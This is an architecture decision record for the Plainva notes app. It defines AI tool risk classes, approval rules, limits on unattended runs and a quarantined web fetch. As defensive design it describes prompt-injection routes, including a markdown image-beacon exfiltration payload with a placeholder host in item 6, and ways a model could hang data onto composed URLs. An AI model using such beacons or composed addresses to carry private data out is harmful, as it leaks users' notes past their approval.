# ADR 0019: AI tools, risk classes and approvals

Status: Accepted

Date: 2026-09-24

## Context

The harness acts through tools: it reads the vault, navigates the app and
proposes changes. The same tools are exposed to other AI applications through
Plainva's MCP server (ADR 0022) and, later, to sandboxed script skills.
Model tool selection degrades with large tool lists (Anthropic names 30–50
tools as the point where selection gets worse and recommends tool search from
about ten), and prompt-injected content must not be able to turn a read into
a write or an outside effect.

## Decision

1. **One manifest per tool, in core.** `packages/core/src/ai/tools/` holds the
   manifests: name, description, JSON schema of input and output, risk class,
   capability, data classes it can return, whether results are tier 3, and
   the native counterpart. The harness registry and the MCP server's
   `tools/list` are generated from the same manifests; a tool without a
   manifest does not exist.
2. **Risk classes.**
   - `read` — `search_vault`, `read_note` (section handles), `get_outline`,
     `get_backlinks`, `graph_neighborhood`, `query_base`, `get_tasks`,
     `get_calendar`, `get_recent`, `parse_task`: allowed when AI is on,
     bounded by folder and policy.
   - `ui` — `ui.run_command(id, args)` over the command registry
     (`commandRegistry.ts`): allowed, audited, reversible; a command without a
     handler is not a tool (fail-closed). The command list is a searchable
     resource, not one tool per command.
   - `write` — create, append, change: always a **proposal** (suggestion round
     with author `plainva-ai/<model-id>`, a parked draft for new notes, a
     property proposal at the property anchor). Provenance through the OKF
     fields (`generated: {by, at}`, `sources`), stamped only at the moment of
     creation.
   - `critical` — delete, bulk change, vault-wide rename or move, and **any
     write to `plainva.ai.*`, `.agent/` or the OKF trust fields**: dry run and
     confirmation enforced in the tool layer; delete only through the deletion
     guard (sample probe, deletion journal, threshold, backup).
   - `external` — mail, RSVP, moving an event, web or API writes, and any write
     into a surface third parties read (events with attendees, provider tasks,
     mail drafts, shared workspaces, publications): separate confirmation
     every time, shown in the send overview.
   - `script` — signed WASM scripts (later package), manifest-bound.
   - `forbidden` — reading the keychain, raw secrets, an unbounded shell,
     direct DB or file writes outside the adapters, raw SQL. Never a tool.
3. **A small, stable surface.** Six core tools are always loaded
   (`search_vault`, `read_note`, `get_outline`, `query_base`, `get_tasks`,
   `ui.run_command`); everything else is found through the provider's tool
   search or Plainva's own `find_tools`. The tool list of a conversation does
   not change while it runs (append-only, ADR 0018).
4. **Results are small and structured.** Paginated, token-lean results;
   section handles instead of full text; structured errors without internal
   paths or SQL; idempotency keys for repeatable writes; every call and result
   audited in the run ledger. Arguments copied verbatim from a tier 3 span
   raise the risk class by one.
5. **Rule of Two at run time.** The orchestrator classifies every run by
   (A) processes untrusted input, (B) sees private data, (C) can change state
   or communicate outward. A run with all three needs an approval for **each**
   outside effect and can never be a routine. Applies from the first chat
   package on.
6. **Pre-write linter.** AI-touched content is checked before it is stored:
   image, link and embed URLs to domains the user has not allowed are defused
   (kept as literal text, or opened only after a click) — including
   protocol-relative `//` URLs, reference-style links (`[x][1]` plus
   `[1]: https://…`) and HTML `<img>`/`<a>`. This closes the rendering-beacon
   class: the desktop CSP allows `img-src https:`, so an injected
   `![](https://host/?d=…)` would otherwise fire on display, past the send
   overview. For what the session stores on a model's behalf — a suggestion
   round, a transcript, a reply in a comment thread — "allowed" is not a
   domain at all: an address stays live only where the user's own text
   already carries it character for character. Allowing its host would let
   the model hang data onto a host a note merely mentions, and the note is
   where an injected instruction comes from.
7. **Guardrails.** Limits for steps, tool calls, tokens and cost with a
   warning at 80 %; a loop guard for repeated identical calls; a circuit
   breaker after three errors; STOP at any time — an abort in the middle of a
   write never leaves half a state, because the write path is atomic.
8. **Unattended runs: one capability set, fixed in advance** (designed with
   the first chat package, built with the routines). A run nobody watches
   gets its capability set when the routine is created, and the user sees it
   then: the tools it may call (the `read` class by default), the folders and
   data classes it may read, the providers it may send to, and a budget per
   run. Nothing widens at run time — a tool outside the set is not offered,
   rather than refused after the call. Whatever needs an approval (every write
   proposal, every external effect) is parked as a pending item in the inbox
   instead of waiting for a person; nothing is carried out unattended. A
   routine that would combine all three Rule-of-Two properties is rejected
   when it is saved, not when it runs. The same set is what a paired MCP or
   ACP client receives (ADR 0022): one capability model for every run without
   a person in front of it.
9. **The internet: three decisions, a native fetch, a reader in quarantine**
   (built with P4). The assistant reaches the internet through two tools,
   `fetch_url` and `web_search`. Both are read tools whose call is itself a
   request to a third party (`outward` in the manifest), so the Rule of Two
   counts them as outside effects.
   - *Three decisions.* The vault allows it: a switch per vault that is off
     until the user decides and lives in the app's data on the device, never
     in the vault, whose writers could otherwise switch it on. The
     conversation was started with it: chosen in the composer for one
     conversation, never kept as a default, and fixed like every tool — a
     conversation that began without it may already carry notes whose rules
     say `web: deny`, so it cannot gain the tools later. And the request
     itself is approved: while private data is in the run, every page and
     every search asks, with the whole address or query, because that is
     everything that leaves the device for it. A refusal is an answer to the
     model, not a failed tool; with nobody to ask, the call does not happen.
   - *Where an address came from.* The approval says whether the address
     stood in the conversation before the model wrote it — in the user's
     words, in a note, in a result — or whether the model composed it. Only a
     composed address can carry data out. A standing approval ("always for
     this site", per vault and device) therefore covers addresses that were
     named, never composed ones; the same distinction marks a link in an
     answer. "The same address" is the whole address: accepting its host
     would let a model hang data onto a host a note merely mentions.
     And a source is only what the model did not write first: a tool can
     repeat its arguments in its result, so what the model wrote into an
     answer or a call never counts as a source afterwards, and a result that
     reports an error names none.
   - *`web: deny`.* In a conversation that carries the web tools, a note
     whose rules say `web: deny` contributes nothing — context, tools, link
     anchors — whoever the recipient is, a model on the device included; the
     gists of folders and of the vault, which stand for many notes, stay out
     as well.
   - *The fetch is native.* One GET over https to port 443, without
     credentials, cookies or a body; every address the name resolves to must
     be public, or nothing is sent; redirects are followed inside the site
     only, each hop checked like the first; at most five hops, two megabytes
     and twenty seconds; text only. The rules are plain functions with one
     set of test vectors, mirrored in TypeScript, Rust, Java and Swift. On
     every platform the fetch is code of its own, apart from the egress that
     holds the provider keys.
   - *Planner and reader.* The model that holds the tools never reads a
     page. A second call without any tool reads it, and what returns is a
     record whose fields are checked against the page: a quote must be on it,
     a link too, free text carries no live address. A page can make the
     report say something untrue, and nothing else.
   - *Search.* Through the model provider's own web search, as a call of its
     own that carries the query and nothing of the conversation; only the
     pages the provider reports are passed on. A model on the device reads
     pages and cannot search; the system's own models take no tools at all.

## Consequences

- MCP, harness and scripts cannot drift apart: they read one manifest.
- The injection corpus (calendar invite, image beacon, `//` URL, reference
  link, HTML `<img>`, Unicode smuggling) runs in CI against the linter and the
  tier-3 wrapper from the first package on.
- Tools that would need a blanket scope are not built; the model gets
  navigation (`ui`) rather than raw access.
- The internet is never ambient. A conversation without the web tools cannot
  be talked into a request, and one with them asks per request while notes
  are in it. The price is a question per page; standing approvals per site
  pay it down for addresses that were named.

## Alternatives

- **One tool per command.** Rejected: 47 desktop commands would push the tool
  count past the range where selection degrades.
- **Direct writes with undo.** Rejected: an injected write that is undone
  later has already been synced, rendered and possibly exfiltrated; proposals
  keep the human in the one approval grammar Plainva already has.
- **A web switch per message.** Rejected: a conversation that began without
  the internet may already carry notes that must never meet it, and what the
  model read cannot be taken back. The choice belongs to the start of a
  conversation, like its other tools.
- **A standing approval that covers every address of a site.** Rejected: an
  address the model composes is the one way data leaves in a GET. Asking for
  exactly those keeps the standing approval safe to give.
- **A search API of Plainva's own choosing, with its own key.** Rejected for
  now: a second account and a second key for every user. Specialised sources
  come through the MCP client instead.

## Links

- ADR 0017, ADR 0018, ADR 0022; `packages/ui/src/services/commandRegistry.ts`;
  `packages/core/src/comments/commentActions.ts`;
  `packages/core/src/okf-trust.ts`.
- `packages/core/src/ai/web/` (rules, reader, search, provenance) and the
  native fetch: `apps/desktop/src-tauri/src/ai_web.rs`, `AiWebPlugin.java`,
  `AiWebPlugin.swift`; `docs/engineering/AI_Threat_Model.md` (T2, T17).
